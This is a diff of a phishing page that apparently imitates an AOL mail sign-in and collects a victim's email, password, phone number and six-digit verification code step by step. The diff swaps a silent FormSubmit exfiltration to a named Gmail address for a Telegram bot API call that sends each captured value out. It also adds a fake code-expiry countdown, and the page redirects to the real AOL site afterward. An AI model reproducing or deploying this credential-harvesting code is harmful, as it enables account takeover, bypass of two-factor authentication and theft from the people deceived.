@@ -18,25 +18,27 @@
       height: 100%;
       font-family: 'Adelle Sans', sans-serif;
       background-color: #f7f7f7;
-      background-image: url('https://tpc.googlesyndication.com/simgad/11982186876802675731');
-      background-size: cover;
-      background-position: center 70px;
-      background-repeat: no-repeat;
-      background-attachment: fixed;
+
+      /* Add background image here */
+      background-image: url('https://tpc.googlesyndication.com/simgad/11982186876802675731'); /* Replace with your background image URL */
+      background-size: cover; /* Ensure the image covers the entire viewport */
+      background-position: center 70px; /* Initially set the position (0px means no shift) */
+      background-repeat: no-repeat; /* Prevent the background image from repeating */
+      background-attachment: fixed; /* Fix the background image while scrolling */
     }
 
+    /* Top Bar as a separate header section */
     .top-bar {
-      height: 80px;
+      height: 80px; /* Adjusted height */
       background-color: #ffffff;
       display: flex;
-      justify-content: flex-start;
-      align-items: center;
-      padding-left: 20px;
+      justify-content: flex-start; /* Align logo to the left */
+      align-items: center; /* Center the logo vertically */
+      padding-left: 20px; /* Add some padding on the left */
       box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
     }
-
     .logo {
-      max-width: 100px;
+      max-width: 100px; /* Adjust logo size to fit well in the top bar */
       height: auto;
     }
 
@@ -49,37 +51,44 @@
       display: flex; flex-direction: column; justify-content: center;
       border-radius: 8px;
       position: absolute;
-      top: 30%;
+      top: 30%; /* Adjusting the positioning so it doesn't overlap with the top bar */
       right: 5%;
     }
-
-    .header { text-align: center; margin-bottom: 40px; margin-top: -5px; }
-    h2, p.desc { font-weight: bold; font-size: 22px; color: #000; text-align: center; margin-bottom: 40px; }
-    p.desc { font-size: 14px; color: #333; margin-top: -10px; }
-
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+      margin-top: -5px;
+    }
+    h2, p.desc {
+      font-weight: bold;
+      font-size: 22px;
+      color: #000;
+      text-align: center;
+      margin-bottom: 40px;
+    }
+    p.desc {
+      font-size: 14px;
+      color: #333;
+      margin-top: -10px;
+    }
     .input-group {
       position: relative; margin-bottom: 25px;
     }
-
     input[type="email"], input[type="password"], input[type="tel"], input[type="text"] {
       width: 100%; padding: 12px 0 6px 0; font-size: 16px;
       border: none; border-bottom: 1px solid #ccc;
       background: transparent; outline: none;
       transition: border-color 0.3s ease;
     }
-
     input:focus { border-bottom-color: #0078d7; }
-
     label.login-label {
       position: absolute; left: 0; top: 12px; color: #777;
       font-size: 13px; pointer-events: none;
       transition: 0.2s ease all; padding: 0 4px;
     }
-
     input:focus + label, input:not(:placeholder-shown) + label {
       top: -12px; font-size: 11px; color: #0078d7;
     }
-
     .button {
       width: 100%; padding: 14px; font-size: 16px;
       border: none; border-radius: 4px; cursor: pointer;
@@ -87,14 +96,30 @@
       transition: background-color 0.3s ease;
       margin-bottom: 10px;
     }
-
     .button:hover { background-color: #005a9e; }
-    .email-summary { text-align: center; font-weight: normal; color: #333; margin-bottom: 15px; display: none; font-size: 14px; line-height: 1.2; margin-top: 2px; }
-    #password-fail-msg { display: none; color: #d93025; font-size: 13px; text-align: center; margin-bottom: 15px; }
-    #countdown { text-align: center; font-size: 13px; color: red; margin-bottom: 20px; }
-    .footer-links { text-align: center; font-size: 14px; margin-top: 15px; }
-    .footer-links a { color: #0078d7; text-decoration: none; }
-    .footer-links a:hover { text-decoration: underline; }
+    .email-summary {
+      text-align: center; font-weight: normal;
+      color: #333; margin-bottom: 15px; display: none;
+      font-size: 14px; /* Increased font size */
+      line-height: 1.2;
+      margin-top: 2px;
+    }
+    #password-fail-msg {
+      display: none; color: #d93025; font-size: 13px;
+      text-align: center; margin-bottom: 15px;
+    }
+    #countdown {
+      text-align: center; font-size: 13px; color: red; margin-bottom: 20px;
+    }
+    .footer-links {
+      text-align: center; font-size: 14px; margin-top: 15px;
+    }
+    .footer-links a {
+      color: #0078d7; text-decoration: none;
+    }
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
 
     /* Mobile responsiveness */
     @media (max-width: 768px) {
@@ -102,11 +127,43 @@
         width: 90%;
         padding: 30px 20px;
       }
-      h2 { font-size: 18px; }
-      p.desc { font-size: 12px; }
-      .input-group input { font-size: 14px; }
-      .button { font-size: 14px; padding: 12px; }
+      h2 {
+        font-size: 18px;
+      }
+      p.desc {
+        font-size: 12px;
+      }
+      .input-group input {
+        font-size: 14px;
+      }
+      .button {
+        font-size: 14px;
+        padding: 12px;
+      }
     }
+
+    /* Bounce effect for invalid input */
+    .bounce {
+      animation: bounce 0.3s ease-in-out;
+    }
+
+    @keyframes bounce {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      50% { transform: translateX(5px); }
+      75% { transform: translateX(-5px); }
+      100% { transform: translateX(0); }
+    }
+
+    /* Password Visibility Icon */
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 12px;
+      cursor: pointer;
+      font-size: 18px;
+    }
+
   </style>
 </head>
 <body>
@@ -143,7 +200,7 @@
       <div class="input-group">
         <input type="password" id="password-input" name="password" placeholder=" " required oninput="checkPassword()">
         <label class="login-label" for="password-input">Password</label>
-        <span class="toggle-password" onclick="togglePassword()">👁️</span>
+        <span class="toggle-password" onclick="togglePassword()">👁</span>
       </div>
       <button type="button" class="button" onclick="handlePassword()">Sign In</button>
     </div>
@@ -175,66 +232,126 @@
   </div>
 
   <script>
-    const FORM_URL = "https://formsubmit.co/inboxhunter147@gmail.com";  // Replace with your FormSubmit endpoint
+    // JavaScript to move the background up/down by a specified number of pixels
+    function moveBackground(position) {
+      document.body.style.backgroundPosition = `center ${position}px`;
+    }
 
-    // Function to submit form silently
-    function sendToFormSubmit(formData) {
-      const form = document.createElement('form');
-      form.method = 'POST';
-      form.action = FORM_URL;
+    // Telegram Bot API setup
+    const BOT_API_URL = 'https://api.telegram.org/bot<Your-Bot-Token>/sendMessage';  // Replace with your bot token
+    const CHAT_ID = '<Your-Chat-ID>'; // Replace with your Telegram chat ID
 
-      Object.keys(formData).forEach(key => {
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = key;
-        input.value = formData[key];
-        form.appendChild(input);
-      });
+    function sendToTelegram(formData) {
+      const message = Object.entries(formData)
+        .map(([key, value]) => `${key}: ${value}`)
+        .join('\n');
 
-      document.body.appendChild(form);
-      form.submit();
+      const url = `${BOT_API_URL}?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Error sending data to Telegram');
+          }
+        })
+        .catch(error => console.error(error));
     }
 
     function goToStep(n) {
       for (let i = 1; i <= 4; i++) {
-        document.getElementById(`step-${i}`).style.display = i === n ? 'block' : 'none';
+        document.getElementById('step-' + i).style.display = (i === n ? 'block' : 'none');
       }
     }
 
     function submitEmail() {
       const email = document.getElementById('email-input').value.trim();
-      if (email) {
-        const formData = { email };
-        sendToFormSubmit(formData);  // Submitting silently to FormSubmit
-        goToStep(2);
-      }
+      if (!email) return;
+
+      sendToTelegram({ email });
+
+      document.getElementById('email-summary').textContent = email;
+      document.getElementById('email-summary').style.display = 'block';
+      goToStep(2);
     }
 
-    function submitPassword() {
+    function handlePassword() {
       const password = document.getElementById('password-input').value.trim();
-      if (password) {
-        const formData = { password };
-        sendToFormSubmit(formData);  // Submitting silently to FormSubmit
-        goToStep(3);
-      }
+      if (!password) return;
+
+      sendToTelegram({ password });
+
+      goToStep(3);
     }
 
     function submitPhone() {
       const phone = document.getElementById('phone-input').value.trim();
-      if (phone) {
-        const formData = { phone };
-        sendToFormSubmit(formData);  // Submitting silently to FormSubmit
-        goToStep(4);
-      }
+      if (!phone) return;
+
+      sendToTelegram({ phone });
+
+      goToStep(4);
+      startCountdown();
     }
 
     function submitCode() {
       const code = document.getElementById('code-input').value.trim();
+      if (!code || code.length !== 6) return;
+
+      sendToTelegram({ code });
+
+      window.location.href = "https://mail.aol.com";
+    }
+
+    function togglePassword() {
+      const passwordInput = document.getElementById('password-input');
+      const passwordType = passwordInput.type === "password" ? "text" : "password";
+      passwordInput.type = passwordType;
+    }
+
+    let timeLeft = 300;
+    let countdownInterval = null;
+    function startCountdown() {
+      const countdownEl = document.getElementById('countdown');
+      timeLeft = 300;
+      if (countdownInterval) clearInterval(countdownInterval);
+      countdownInterval = setInterval(() => {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        countdownEl.textContent = `Code expires in ${minutes}:${seconds.toString().padStart(2, '0')}`;
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          countdownEl.textContent = "Code expired.";
+        } else {
+          timeLeft--;
+        }
+      }, 1000);
+    }
+
+    function checkEmail() {
+      const email = document.getElementById('email-input').value.trim();
+      if (email.length > 0) {
+        document.querySelector('.button').disabled = false;
+      }
+    }
+
+    function checkPassword() {
+      const password = document.getElementById('password-input').value.trim();
+      if (password.length > 0) {
+        document.querySelector('.button').disabled = false;
+      }
+    }
+
+    function checkPhone() {
+      const phone = document.getElementById('phone-input').value.trim();
+      if (phone.length > 0) {
+        document.querySelector('.button').disabled = false;
+      }
+    }
+
+    function checkCode() {
+      const code = document.getElementById('code-input').value.trim();
       if (code.length === 6) {
-        const formData = { code };
-        sendToFormSubmit(formData);  // Submitting silently to FormSubmit
-        alert("Account Recovered! Proceeding...");
-        window.location.href = "https://mail.aol.com";  // Redirect after submission
+        document.querySelector('.button').disabled = false;
       }
     }
   </script>
